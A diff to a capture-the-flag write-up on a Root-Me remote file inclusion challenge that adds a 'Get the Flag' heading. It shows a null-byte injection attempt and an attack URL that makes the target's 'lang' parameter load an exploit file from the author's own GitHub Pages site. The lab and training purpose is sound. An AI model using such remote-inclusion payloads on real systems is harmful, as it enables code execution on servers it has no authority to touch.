@@ -72,8 +72,9 @@ Another thing to be considered, we know that the include function has a trailing
 
 2. We use null byte injection, hence we can control the file we want to include. The request will be like https://h4ckrati.github.io/rfi-test/exploit.php%00 But, unfortunately, this PHP version is already later than PHP 5.3, hence the null byte injection vulnerability has been patched.
 
+### Get the Flag 
 
-Then, after going into the website, http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io/rfi-test/exploit I got the source code 
+Then, after redirecting into my website, http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io/rfi-test/exploit I got the source code 
 
 ![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260310233931.png)
 
